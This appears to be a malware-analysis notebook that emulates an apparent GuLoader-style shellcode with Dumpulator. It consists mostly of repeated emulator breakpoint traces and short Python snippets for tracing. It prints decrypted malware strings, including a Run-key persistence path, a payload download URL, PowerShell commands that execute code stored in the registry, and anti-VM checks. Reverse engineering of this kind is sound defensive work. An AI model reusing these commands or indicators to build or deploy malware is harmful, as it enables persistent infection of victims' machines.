stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d10c, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d11a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d126, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d138, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d151, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d161, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d170, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d182, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d1a3, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d1b2, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d1c2, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d1d3, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d1f1, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d20b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d223, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d22f, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d245, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d25a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d26d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d27e, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d28f, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d2aa, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d2b4, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d33d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d34a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d35d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d36e, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d398, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d3ad, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d3b8, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d3cd, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d3df, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d3ef, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d406, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d419, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d42c, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d444, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d45a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d46b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d490, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d49c, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d4af, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d4b7, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d4b7, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d4b7, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d4cc, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d4e0, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d4f8, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d516, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d526, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d533, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d53e, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d550, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d55b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d570, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d581, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d59f, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d5ac, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d5bf, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d621, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d632, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d644, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d65d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d677, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45d68b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c948, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c958, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c963, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c977, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c9a2, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45c9b7, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ca39, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ca39, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ca39, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ca56, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ca68, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ca6d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ca86, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ca99, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45caa5, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45cabe, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45cac3, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45cae9, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45cb02, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45cb1f, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45cb23, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45cb2a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45cb2a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45cb2a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45cb42, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45cb51, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45cb6a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45cb6f, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45cb89, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45cb9c, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45cba4, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45cbb9, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45cbcc, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45cbdb, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45cbf9, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45cc04, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45cc1d, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45cc38, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45cc4b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45cc60, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45cc6f, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45cc82, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45cc89, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45cc92, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ccaa, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ccb0, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ccbc, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45cccf, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45cce4, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ccec, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ccfd, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45cd0f, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45cd23, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45cd38, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45cd51, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45cda3, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45cdb9, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45cdcf, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45cdd8, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45cdef, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45cdfa, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ce06, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ce12, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ce23, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ce38, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ce4e, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ce59, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ce67, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ce7f, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ce87, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ce8e, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45cea3, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ceaa, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ced1, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45ceee, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45cf03, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45cf26, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45cf3f, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45cf4e, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 45cf52, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457aa2, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457aa6, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457aae, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457ac6, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457ad6, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457ae5, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457af3, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457b09, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457b22, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457b3b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457b42, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457b53, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457b59, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457b65, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457b65, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457b65, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457b7b, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457b8a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457b96, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457ba0, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457bbb, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457bc6, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457bd5, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457bea, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457bfa, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457c04, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457c11, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457c2c, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457c33, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457c4e, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457c53, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457c6a, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457c76, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457c92, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457cae, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457cbc, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457cc7, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457cdb, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457ceb, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457d08, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457d0f, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457d8c, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457da9, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 interrupt 3 (#BP, Breakpoint), cip = 457db9, cs = 23 context switch, stopping emulation forced exit memory operation 21 of 4fe2[1] = 0 . out_strs . [&#39;&#39;, &#39;user32&#39;, &#39;psapi.dll&#39;, &#39;Msi.dll&#39;, &#39;Publisher&#39;, &#39;Software Microsoft Windows CurrentVersion Run&#39;, &#39;Skattekister138&#39;, &#39;OverOps146.70.147.12/vSFjv98.fla&#39;, &#39;SOFTWARE AppDataLow &#39;, &#39;Tumorlike&#39;, &#34;%PSHEX% -windowstyle minimized $Tritetartemorion=(Get-ItemProperty -Path &#39;HKCU: SOFTWARE AppDataLow &#39;).Tumorlike;%PSHEX% -windowstyle minimized ($Tritetartemorion)&#34;, &#34;%PSHEX% -windowstyle minimized $Ddsensalvorligt=(Get-ItemProperty -Path &#39;HKCU: SOFTWARE AppDataLow &#39;).Tumorlike;%PSHEX% -windowstyle minimized ($Ddsensalvorligt)&#34;, &#39;Environment&#39;, &#39;PSHEX&#39;, &#39;c: windows system32 WindowsPowerShell v1.0 powershell.exe&#39;, &#39;c: windows SysWOW64 WindowsPowerShell v1.0 powershell.exe&#39;, &#39;&#39;, &#39;&#39;, &#39;ProgramFiles=&#39;, &#39; internet explorer ieinstal.exe&#39;, &#39; internet explorer ielowutil.exe&#39;, &#39; internet explorer ExtExport.exe&#39;, &#39;windir=&#39;, &#39; system32 &#39;, &#39; syswow64 &#39;, &#39;iertutil.dll&#39;, &#39;wininet.dll&#39;, &#39;Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko&#39;, &#39;KERNELBASE.DLL&#39;, &#39;shell32&#39;, &#39;advapi32&#39;, &#39;C: Program Files Qemu-ga qemu-ga.exe&#39;, &#39;C: Program Files qga qga.exe&#39;, &#39;TEMP=&#39;] . # Load the emulator dp = Dumpulator(&quot;/tmp/gudump.dmp&quot;, quiet=True, trace=True) # Load the VEH veh_stop_addr = 0x04A7 + base dp.start(0x440000, end=veh_stop_addr) . protect 0x770f9000[0x3000] = PAGE_READWRITE protect 0x770f9000[0x3000] = PAGE_READONLY . trace_file = open(&#39;/tmp/gudump.dmp.trace&#39;,&#39;rb&#39;).read() trace_addr = [] for trace_line in trace_file.split(b&#39; n&#39;): try: t_addr = int(trace_line.decode(&#39;utf-8&#39;).split(&#39;|&#39;)[0], 16) if 0x440000 &lt;= t_addr &lt; 0x440000 + 0x2a000: trace_addr.append(t_addr - base) except: t_addr = int(trace_line.decode(&#39;utf-8&#39;).split(&#39; &#39;)[0], 16) if 0x440000 &lt;= t_addr &lt; 0x440000 + 0x2a000: trace_addr.append(t_addr - base) . trace_addr = list(set(trace_addr)) print(trace_addr) . [0, 153600, 149504, 153603, 149510, 149512, 153609, 153612, 149518, 149519, 153618, 149525, 149527, 153624, 153627, 149533, 153629, 149538, 153635, 153641, 153643, 153649, 153655, 165946, 153660, 165949, 153662, 153668, 153670, 153676, 153678, 153684, 149604, 149606, 149611, 149613, 149618, 149623, 149625, 149631, 149637, 149639, 149640, 166023, 149642, 166028, 149647, 166034, 149652, 168085, 149658, 149663, 149668, 153766, 149670, 153768, 149673, 149676, 153774, 149678, 153780, 149684, 153782, 149686, 153785, 149689, 153787, 149691, 149694, 149699, 149700, 149703, 149705, 149711, 149717, 149722, 149727, 149729, 149734, 149739, 149741, 149747, 149749, 149753, 149755, 149757, 149759, 257, 149764, 149769, 166156, 149775, 149776, 166159, 149778, 149779, 166161, 149781, 166164, 149787, 149789, 149795, 149797, 149798, 149804, 149806, 149811, 149813, 149820, 149823, 149830, 149837, 149839, 149842, 149848, 149853, 149858, 149864, 149870, 166262, 375, 166263, 166265, 380, 166271, 149952, 450, 149954, 452, 149960, 149962, 149963, 149969, 149972, 149974, 149977, 149980, 149985, 149990, 149996, 149998, 150000, 150004, 166389, 166391, 150009, 150012, 150014, 150016, 150017, 150019, 150021, 150026, 150027, 150029, 150032, 534, 536, 538, 150043, 150058, 150061, 150064, 150067, 150069, 150072, 150074, 150077, 150079, 150081, 150084, 150086, 150089, 150092, 150094, 150097, 150099, 150102, 150105, 150108, 150111, 150113, 150116, 150118, 150120, 166505, 150123, 166508, 150125, 150131, 628, 150133, 630, 150135, 632, 150136, 634, 150138, 640, 150144, 150146, 646, 648, 150152, 650, 150154, 652, 653, 654, 150155, 656, 150161, 